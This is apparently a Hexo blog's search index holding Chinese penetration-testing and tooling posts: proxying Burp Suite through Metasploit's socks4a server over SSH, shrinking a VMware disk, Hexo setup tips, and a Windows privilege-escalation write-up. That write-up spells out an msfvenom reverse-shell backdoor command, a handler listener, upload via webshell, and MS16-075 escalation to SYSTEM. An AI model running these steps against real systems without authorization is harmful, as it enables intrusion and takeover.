<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[让BurpSuite使用MSF的socks4a代理]]></title>
    <url>%2F2019%2F07%2F11%2F%E8%AE%A9BURP%E4%BD%BF%E7%94%A8MSF%E7%9A%84socks4a%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[前言最近在使用msf转发流量时遇到了个问题，就是使用auxiliary/server/socks4a做代理时，burpsuite不支持socks4a代理，导致无法使用burp去抓包。而使用auxiliary/server/socks5做代理却失败了，可能是脚本的bug，官方issues也有人反馈这个问题。 具体问题演示环境我所在的环境比较特殊，工作机（192.168.1.2，Windows）位于A地内网，MSF机器（172.16.1.2，Linux）位于B地内网，两内网不相通，但是可以通过11.11.11.11:22 SSH访问MSF机器，遂用SSH隧道将172.16.1.2:11080端口转发到工作机的127.0.0.1:1083端口，如果不清楚这个操作，可以理解为工作机访问本机127.0.0.1:1083端口等价于访问MSF机172.16.1.2:11080端口。 测试步骤 在MSF机器启动socks4a代理（前面获取反弹shell、设置路由的步骤略过）123msf5 auxiliary(server/socks4a) &gt; use auxiliary/server/socks4a msf5 auxiliary(server/socks4a) &gt; set SRVPORT 11080msf5 auxiliary(server/socks4a) &gt; exploit 在配置代理前，我的ip地址是A地公网ip 使用Firefox配置代理测试转发是否正常，这时ip由联通变成电信了，证明代理转发隧道工作正常 这个时候，如果直接在burpsuite配置前置socks代理的话是不能使用的，因为burpsuite不支持socks4协议，所以会打不开网页 解决方法使用sockscap64工具，把socks4a转发为http代理。当然，使用其它工具将socks4a转为http代理或socks5代理也行，比如Linux下的privoxy，socks4a转socks5的工具找了很久都没找到，遂放弃。 步骤 打开sockscap64工具，创建代理配置，代理服务器为127.0.0.1:1083（MSF socks4a端口地址） burpsuite配置前置http代理，代理服务地址为127.0.0.1:25378，这个端口是sockscap64监听的端口 打开Firefox测试，可以看到现在已经是MSF机器的电信ip了，问题成功解决。 回顾下出口流量走向，如下： 为什么是25378端口 SockScap64支持系统代理 启用系统代理可发现其使用25378端口做代理服务st=>start: 工作机Firefox e=>end: 目标网络 op1=>operation: burp代理（127.0.0.1:1080) op2=>operation: SocksCap64本地代理（127.0.0.1:25378) op3=>operation: ssh本地转发端口（127.0.0.1:1083) op4=>operation: msf socks4a端口（172.16.1.2:11083） st->op1->op2->op3->op4->e{"scale":1,"line-width":2,"line-length":50,"text-margin":10,"font-size":12} var code = document.getElementById("flowchart-0-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("flowchart-0-options").value)); var diagram = flowchart.parse(code); diagram.drawSVG("flowchart-0", options);]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[VMware虚拟机导出压缩]]></title>
    <url>%2F2019%2F07%2F11%2FVMware%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%AF%BC%E5%87%BA%E5%8E%8B%E7%BC%A9%2F</url>
    <content type="text"><![CDATA[先清理系统垃圾文件比如有安装nessus，先删除其插件备份文件： 12rm /opt/nessus/var/nessus/plugins-code.db.1555813621612956655 rm /opt/nessus/var/nessus/plugins-desc.db.15558136311650186018 然后清理swap文件：先执行sync命令，sync命令用于强制被改变的内容立刻写入磁盘，更新超块信息，以防止释放，sync命令则可用来强制将内存缓冲区中的数据立即写入磁盘中。sync关闭swap：swapoff -a 压缩虚拟机磁盘空间先填充虚拟机磁盘：cat /dev/zero &gt; zero.fill;sync;sleep 1;sync;rm -f zero.fill 使用vm磁盘工具压缩空间 vmware-vdiskmanager.exe -k &quot;G:\vmfiles\Pentest_Linux\Nessus 8_VM12-disk1-cl1.vmdk&quot; 导出为ovf文件 效果原本直接导出大概生成8G大小的文件，压缩后只需不到4G]]></content>
      <categories>
        <category>折腾</category>
      </categories>
      <tags>
        <tag>折腾</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记一次Windows提权过程]]></title>
    <url>%2F2019%2F07%2F10%2F%E8%AE%B0%E4%B8%80%E6%AC%A1Windows%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[通过任意文件上传获取到ASP webshell 生成msf meterpreter后门msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=4444 -f exe &gt; shell1.exe 启动监听use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST x.x.x.x set LPORT xx exploit 通过webshell上传并执行木马 msf接收到会话 查看当前用户getuid use incognito list_tokens -u 查找可利用的提权exprun post/multi/recon/local_exploit_suggester 把当前msf回话放到后台，并记住其session值为5bg 利用ms16_075得到system权限]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HEXO建站遇到的几个坑与解决方案]]></title>
    <url>%2F2019%2F07%2F08%2FHEXO%E5%BB%BA%E7%AB%99%E9%81%87%E5%88%B0%E7%9A%84%E5%87%A0%E4%B8%AA%E5%9D%91%E4%B8%8E%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[本地图片引用npm install hexo-asset-image --save 自动部署到githubnpm install hexo-deployer-git --save 添加流程图支持npm install --save hexo-filter-flowchart安装成功后，需要在根路径的_config.yml文件添加下列代码 1234flowchart: # raphael: # optional, the source url of raphael.js # flowchart: # optional, the source url of flowchart.js options: # options used for `drawSVG` 有空再把坑填完 ~]]></content>
      <categories>
        <category>其它</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[浅谈代理隧道的几种应用场景]]></title>
    <url>%2F2019%2F07%2F08%2F%E6%B5%85%E8%B0%88%E4%BB%A3%E7%90%86%E9%9A%A7%E9%81%93%E7%9A%84%E5%87%A0%E7%A7%8D%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF%2F</url>
    <content type="text"><![CDATA[前言SOCKS代理隧道HTTP代理隧道代理隧道建立的几种方式代理隧道的几种应用场景 有空再把坑填完 ~]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>网络</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F07%2F05%2Fhello-world%2F</url>
    <content type="text"><![CDATA[这里空空如也 ~]]></content>
  </entry>
</search>
